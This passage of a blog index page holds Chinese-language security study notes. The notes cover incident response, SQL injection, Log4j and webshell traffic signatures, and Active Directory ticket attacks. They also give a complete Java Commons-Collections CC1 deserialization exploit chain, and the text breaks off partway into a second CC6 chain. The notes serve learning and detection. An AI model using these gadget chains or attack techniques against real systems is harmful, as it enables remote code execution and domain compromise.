<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><title>cyxin</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '6.0.0'
} </script><meta name="generator" content="Hexo 6.0.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">John Doe</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">31</span></a></div></div></div><nav id="nav" style="background-image: url(https://cdn.eso.org/images/screen/eso0932a.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">cyxin</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="site-info"><div id="site-title">cyxin</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2022/06/19/%E6%8A%A4%E7%BD%91%EF%BC%88%E4%B8%80%EF%BC%89/">护网（一）</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-06-19</time><div class="content"><h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h2><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><h5 id="1、查看系统账户是否安全"><a href="#1、查看系统账户是否安全" class="headerlink" title="1、查看系统账户是否安全"></a>1、查看系统账户是否安全</h5><p>比如看看服务器是否有弱口令，看看远程端口是否对公网开放，，之后看看服务器是不是有可疑账户，、新增账户</p>
<h5 id="2、看看是否具有异常端口、进程"><a href="#2、看看是否具有异常端口、进程" class="headerlink" title="2、看看是否具有异常端口、进程"></a>2、看看是否具有异常端口、进程</h5><p>查看端口连接情况，是否有远程连接、可疑连接</p>
<p>排查可疑进程（可以利用D盾工具进行排查，或者手动打开进程管理器进行排查）</p>
<h5 id="3、检查启动项、任务计划、服务"><a href="#3、检查启动项、任务计划、服务" class="headerlink" title="3、检查启动项、任务计划、服务"></a>3、检查启动项、任务计划、服务</h5><p>看看是否具有异常启动项，看看计划任务、服务自启动，有没有异常的服务自动启动</p>
<h5 id="4、之后看看是否具有可疑文件、目录"><a href="#4、之后看看是否具有可疑文件、目录" class="headerlink" title="4、之后看看是否具有可疑文件、目录"></a>4、之后看看是否具有可疑文件、目录</h5><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><h5 id="1、查看账号是否安全"><a href="#1、查看账号是否安全" class="headerlink" title="1、查看账号是否安全"></a>1、查看账号是否安全</h5><p>/etc/passwd  看用户信息</p>
<p>/etc/shadow看密码</p>
<h5 id="2、通过-bash-history查看帐号执行过的系统命令"><a href="#2、通过-bash-history查看帐号执行过的系统命令" class="headerlink" title="2、通过.bash_history查看帐号执行过的系统命令"></a>2、通过.bash_history查看帐号执行过的系统命令</h5><h5 id="3、看端口、进程、开机启动项、定时任务（crontab-i）"><a href="#3、看端口、进程、开机启动项、定时任务（crontab-i）" class="headerlink" title="3、看端口、进程、开机启动项、定时任务（crontab -i）"></a>3、看端口、进程、开机启动项、定时任务（crontab -i）</h5><h5 id="4、检查异常文件"><a href="#4、检查异常文件" class="headerlink" title="4、检查异常文件"></a>4、检查异常文件</h5><p>后门常放位置（**/tmp** 、**/etc/rc.**local  有时可以读出来<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020">apache</a>的路径）</p>
<p><strong>crontab  log</strong></p>
<h2 id="sqlmap原理"><a href="#sqlmap原理" class="headerlink" title="sqlmap原理"></a>sqlmap原理</h2><p>​    它的工作原理和手工注入的原理是一样的：检测动态页面中get/post参数、cookie、 http头，并爆出数据，不需要我们再手动写payload，因为它有非常强大的引擎，各种各样的参数、各种各样的位置，它都可以去完成SQL注入漏洞的检测、利用、以及数据的提取</p>
<h4 id="sqlmap-os-shell原理"><a href="#sqlmap-os-shell原理" class="headerlink" title="sqlmap -os -shell原理"></a>sqlmap -os -shell原理</h4><p>​        原理很简单，就是用into outfile函数将一个可以用来上传的php文件写到网站的目录下，然后利用tmpukjhb.php上传了一个tmpbezal.php的文件，tmpbezal.php这个文件可以用来执行系统命令，并且将结果返回出来</p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>​    Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击</p>
<ul>
<li>猜解后台数据库，这是利用最多的方式，盗取网站的敏感信息。</li>
<li>绕过认证，列如绕过验证登录网站后台。</li>
<li>注入可以借助数据库的存储过程进行提权等操作</li>
</ul>
<p>防御</p>
<p>1、检查变量数据类型和格式</p>
<p>2、过滤特殊符号</p>
<p>3、绑定变量，使用预编译语句　</p>
<h5 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h5><p>就是将一堆sql语句叠加在一起执行，使用分号结束上一个语句再叠加其他语句一起执行</p>
<h5 id="报错注入常用函数"><a href="#报错注入常用函数" class="headerlink" title="报错注入常用函数"></a>报错注入常用函数</h5><p>updatexml():是mysql对xml文档数据进行查询和修改的xpath函数<br>extractvalue()：是mysql对xml文档数据进行查询的xpath函数<br>floor():mysql中用来取整的函数<br>exp():此函数返回e(自然对数的底)指数X的幂值</p>
<h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。</p>
<h2 id="log4j原理"><a href="#log4j原理" class="headerlink" title="log4j原理"></a>log4j原理</h2><p>  通过JNDI注入漏洞，黑客可以恶意构造特殊数据请求包，触发此漏洞，从而成功利用此漏洞可以在目标服务器上执行任意代码</p>
<p><strong>JNID</strong></p>
<p> 即 Java 的名称与目录服务接口，应用通过该接口与具体的目录服务进行交互</p>
<h5 id="攻击特征"><a href="#攻击特征" class="headerlink" title="攻击特征"></a>攻击特征</h5><p>攻击者在攻击过程中可能使用 DNSLog 进行漏洞探测，建议查看是否有相关DNSlog告警（对应科来TSA规则：“信息泄露-通过外部平台回显数据”）；</p>
<p> 回溯流量或日志中是否存在“jndi:ldap://”、“jndi:rmi”等字符。</p>
<h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><h4 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h4><blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">CS中：shell+命令即可</span><br><span class="line">//主机信息</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">//网络信息</span><br><span class="line">ipconfig /all</span><br><span class="line"></span><br><span class="line">//路由表</span><br><span class="line">arp -a</span><br><span class="line"></span><br><span class="line">//进程，查AV</span><br><span class="line">tasklist</span><br><span class="line"></span><br><span class="line">//端口占用情况</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">//是否域环境</span><br><span class="line">net user /domain</span><br><span class="line"></span><br><span class="line">//是否出网</span><br><span class="line">ping baidu.com -n 2</span><br></pre></td></tr></table></figure>
</blockquote>
<p>在横向运输前最好先挂挂代理，使得我们可以使用msf的其他工具</p>
<h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><p>​        横向移动是指当攻击者在内部网络中获得初始访问权限以后，通过扫描，口令爆破，smb传递等技术扩大敏感数据和高价值资产权限并通过受攻击网络环境中移动的行为</p>
<h4 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h4><p>​        域控简称DC，是在内网里响应安全身份认证请求的网络服务器，对用户进行身份验证，存储用户账户信息，并执行的域的一种安全策略</p>
<h4 id="域"><a href="#域" class="headerlink" title="域"></a>域</h4><p>“域”是一个有安全边界的计算机组合（一个域中的用户无法访问另一个域中的资源）</p>
<h4 id="普通用户获取域管理权限"><a href="#普通用户获取域管理权限" class="headerlink" title="普通用户获取域管理权限"></a>普通用户获取域管理权限</h4><p><strong>利用GPP漏洞获取域管理权限</strong></p>
<p>SYSVOL是域内的共享文件夹，用来存放登录脚本、组策略脚本等信息。当域管理员通过组策略修改密码时，在脚本中引入用户密码，就可能导致安全问题</p>
<p>1）访问SYSVOL共享文件夹，搜索包含“cpassword”的XML文件，获取AES加密的密码。</p>
<p>2）使用kali自带的gpp-decrypt进行破解，从而获取域账号密码，直接登录域管理员账号获取访问权限。</p>
<p><strong>获取服务器明文登录密码</strong></p>
<p>使用kiwi模块需要system权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。提到system有两个方法，一是当前的权限是administrator用户，二是利用其它手段先提权到administrator用户。然后administrator用户可以直接getsystem到system权限</p>
<p><strong>使用MS14-068漏洞进行提权</strong></p>
<p>MS14068是一个能够使普通用户提权到域控权限的权限提升漏洞。攻击者可以通过构造特定的请求包来达到提升权限的目的</p>
<p><strong>窃取域管理员令牌</strong></p>
<p><strong>进程迁移</strong></p>
<h4 id="票据"><a href="#票据" class="headerlink" title="票据"></a>票据</h4><p>域认证三部曲：</p>
<ol>
<li>Client 上的用户请求KDC服务，最后AS服务生产TGT，返回给Client</li>
<li>Client 使用TGT请求KDC上的TGS得到ST（TGS ticket）真正访问的票据</li>
<li>Client使用ST（TGS Ticket）访问Server</li>
</ol>
<p>名词基本概念：</p>
<p>​    KDC: Key Distribution Center，密钥分发中心，负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由AS和TGS组成。</p>
<p>​    AD: Account Database，存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。</p>
<p>（物理方面 KDC和AD 都是一个机子）</p>
<p>​    TGT: Ticket Granting Ticket = 入场券，通过入场券能够获得票据，是一种临时凭证的存在。</p>
<p>​    AS（Authentication Server）= 认证服务器,为client生成TGT的服务</p>
<p>​    TGS（Ticket Granting Server）= 票据授权服务器</p>
<p>​    SS（Service Server）= 特定服务提供端</p>
<h5 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h5><p>前提：</p>
<p>1.不需要与KDC进行交互，直接和server认证</p>
<p>2.需要目标服务的NTLM Hash</p>
<p>如果我们拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket，直接去server端去验证。</p>
<p>注：服务器是不知道Server Session Key是什么的，服务器的Server Session Key是解密ticket获得的，所以一切凭据的核心在Server Hash，有了它就开业直接伪造票据认证。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ticket=Server Hash(Server Session Key+Client info+End Time) </span><br></pre></td></tr></table></figure>

<p>由于白银票据需要目标服务器的Hash，所以没办法生成对应域内 所有服务器的票据。因此只能针对服务器 上的某些服务去伪造</p>
<h5 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h5><p>前提：</p>
<p>1.需要与DC通信</p>
<p>2.需要krbtgt用户的hash（也就是说要拿下域控制器）</p>
<p>原理：</p>
<p>就是伪造的TGT，它会在第二步认证被发送到KDC的TGS，如果我们有了krbtgt用户的hash就可以直接伪造TGT，其中的KDC需要的session key，是KDC解密TGT之后获取的，所以session key也是和TGT一起伪造的，那么后续的认证，就可以随意的制造想要的票据了。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43171033/article/details/115933240">资料</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/291655.html">资料</a></p>
<h4 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h4><p>成因：</p>
<p>KDC（密钥分发）对PAC进行验证时，对于PAC尾部的签名算法，虽然原理上规定必须是带有Key的签名算法才可以，但微软在实现上，却允许任意签名算法，只要客户端指定任意签名算法，KDC服务器就会使用指定的算法进行签名验证。因此伪造的任意内容都可以是合法的，直接加上内容的MD5值作为签名即可（第一个原因）</p>
<p> PAC没有被放在TGT中，放在其它地方。KDC在仍然能够正确解析出没有放在TGT中的PAC信息PAC必须是密文，经过Key加密的KDC会从Authenticator中取出来subkey，把PAC信息解密并利用客户端设定的签名算法验证签名（第二个原因）</p>
<p>KDC验证缺少PAC的TGT成功后，再验证不在TGT中 的PAC的合法性。如果2个均验证成功，KDC把PAC中的User SID、Group SID取出来，重新使用进行签名，签名算法和密钥与设置inclue-pac标志位为TRUE时一模一样。将将新产生的PAC加入到解密后的TGT中，再重新加密制作全新的TGT发送给Client，不是TGS（第三个原因）</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/feizianquan/p/11760564.html#autoid-5-0-0">资料</a></p>
<h2 id="webshell流量分析"><a href="#webshell流量分析" class="headerlink" title="webshell流量分析"></a>webshell流量分析</h2><h4 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h4><p>静态特征： 一句话木马</p>
<p>动态特征：</p>
<blockquote>
<p>请求包中：</p>
<p>ua头为百度爬虫</p>
<p>请求体中存在eavl，base64等特征字符</p>
<p>请求体中传递的payload为base64编码，并且存在固定的QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J</p>
<p>请求体中执行结果响应为明文</p>
</blockquote>
<h4 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h4><p><strong>默认编码连接时</strong></p>
<p>这里我们直接使用菜刀的一句话webshell</p>
<p>每个请求体都存在@ini_set(“display_errors”, “0”);@set_time_limit(0)开头。并且存在base64等字符</p>
<p>响应包的结果返回格式为 随机数 结果 随机数</p>
<p><strong>使用base64编码器和解码器时</strong></p>
<p>蚁剑会随机生成一个参数传入base64编码后的代码，密码参数的值是通过POST获取随机参数的值然后进行base64解码后使用eval执行</p>
<p>响应包的结果返回格式为 随机数 编码后的结果 随机数</p>
<h4 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h4><p>采用采用预共享密钥，密钥格式为md5(“admin”)[0:16], 所以在各种语言的webshell中都会存在16位数的连接密码，默认变量为k。</p>
<p>在PHP中会判断是否开启openssl采用不同的加密算法，在代码中同样会存在eval或assert等字符特征</p>
<p>在jsp中则利用java的反射，所以会存在ClassLoader，getClass().getClassLoader()等字符特征</p>
<p>在aps中会在for循环进行一段异或处理</p>
<h5 id="冰蝎2-0-webshell木马动态特征"><a href="#冰蝎2-0-webshell木马动态特征" class="headerlink" title="冰蝎2.0 webshell木马动态特征"></a>冰蝎2.0 webshell木马动态特征</h5><p>在了解冰蝎3.0之前，先看看2.0是怎么交互等</p>
<p>2.0中采用协商密钥机制。第一阶段请求中返回包状态码为200，返回内容必定是16位的密钥</p>
<p>Accept: text/html, image/gif, image/jpeg, *; q=.2, <em>/</em>; q=.2</p>
<p>建立连接后 所有请求 Cookie的格式都为: Cookie: PHPSESSID=; path=/；</p>
<h5 id="冰蝎3-0-webshell木马动态特征"><a href="#冰蝎3-0-webshell木马动态特征" class="headerlink" title="冰蝎3.0 webshell木马动态特征"></a>冰蝎3.0 webshell木马动态特征</h5><p>在3.0中改了，去除了动态密钥协商机制，采用预共享密钥，全程无明文交互，密钥格式为md5(“admin”)[0:16],但还是会存在一些特征</p>
<p>在使用命令执行功能时，请求包中content-length 为5740或5720（可能会根据Java版本而改变）</p>
<p>每一个请求头中存在Pragma: no-cache，Cache-Control: no-cache</p>
<p>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9</p>
<h4 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h4><p>哥斯拉webshell静态特征</p>
<p>选择默认脚本编码生成的情况下，jsp会出现xc,pass字符和Java反射（ClassLoader，getClass().getClassLoader()），base64加解码等特征</p>
<p>php，asp则为普通的一句话木马</p>
<h5 id="哥斯拉webshell动态特征"><a href="#哥斯拉webshell动态特征" class="headerlink" title="哥斯拉webshell动态特征"></a>哥斯拉webshell动态特征</h5><p>所有请求中Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8</p>
<p>所有响应中Cache-Control: no-store, no-cache, must-revalidate,</p>
<p>以上两个只能作为弱特征参考</p>
<p>同时在所有请求中Cookie中后面都存在；特征</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/06/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/">java反序列化学习（二）</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-06-17</time><div class="content"><h2 id="反序列化漏洞原理"><a href="#反序列化漏洞原理" class="headerlink" title="反序列化漏洞原理"></a>反序列化漏洞原理</h2><p>1、接受任意对象</p>
<p>2、执行readObject方法</p>
<p>java反序列化调用时一定会调用readObject方法，由于readObject是可以重写的，然后我们通过传递一些危险的对象从而调用危险的方法</p>
<p>可以利用不同类 的同名函数</p>
<p>任意方法调用（反射/动态加载字节码）</p>
<p>readObject()方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回，readObject()是可以重写的，可以定制反序列化的一些行为。</p>
<p><strong>注意</strong></p>
<p>入口类要可序列化，同时重写了readObject，接受任意对象作为参数</p>
<h2 id="cc1链"><a href="#cc1链" class="headerlink" title="cc1链"></a>cc1链</h2><p><strong>环境</strong></p>
<p>需要jdk-8u65</p>
<p>maven需要3.2.1</p>
<p>利用点：Transformer类；利用invoketransformer内部的Transformer类从而利用反射，实现危险函数利用。</p>
<p><strong>漏洞利用过程</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">import sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">//        Runtime r = Runtime.getRuntime();</span><br><span class="line">//        Class runtime = Runtime.class;</span><br><span class="line">//        Method getRuntimeMethod = runtime.getMethod(&quot;getRuntime&quot;,null);</span><br><span class="line">//        Runtime a = (Runtime) getRuntimeMethod.invoke(null,null);</span><br><span class="line">//        Method execMethod = runtime.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">//        execMethod.invoke(a,&quot;calc&quot;);</span><br><span class="line">//        Method getRuntimeMethod =(Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span><br><span class="line">//        Runtime a= (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span><br><span class="line">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(a);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">//        chainedTransformer.transform(Runtime.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//        Class c = Runtime.class;</span><br><span class="line">//        Method calcmethod = c.getMethod(&quot;exec&quot;,String.class);</span><br><span class="line">//        calcmethod.invoke(r,&quot;calc&quot;);</span><br><span class="line">//        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        hashMap.put(&quot;value&quot;, &quot;aaa&quot;);</span><br><span class="line">        Map&lt;Object, Object&gt; Map = TransformedMap.decorate(hashMap, null, chainedTransformer);</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line">        Object o = constructor.newInstance(Retention.class, Map);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>整体思路</strong></p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject -&gt; Map.setValue -&gt; TransformedMap.checkSetValue -&gt; ChainedTransformer.transform -&gt; InvokeTransformer.transform -&gt; 代码执行</span><br></pre></td></tr></table></figure>
</blockquote>
<p>由于Runtime.getRuntime.exec();无法反序列化，因此需要反射</p>
<p><img src="https://img-blog.csdnimg.cn/01d9bc03454b42579f6cb65c16daeaf7.png#pic_center"><br>具体情节可以参考</p>
<p><a target="_blank" rel="noopener" href="https://su18.org/post/ysoserial-su18-2/#%E6%80%BB%E7%BB%93">cc1(1)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cjdgg/article/details/122277578">cc1(2)</a></p>
<p><a target="_blank" rel="noopener" href="https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/">cc1(3)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=bf5252f16d46d7c835443b27896d7f4c">cc1(4)</a></p>
<h2 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h2><p>流程：（下方那个，上方的为cc1）</p>
<p><img src="https://img-blog.csdnimg.cn/91153f76f8074e9d8c3f8df1829310de.png#pic_center" alt=" "></p>
<p>优点:不受java版本控制，任何版本的java都可以使用该链子</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span 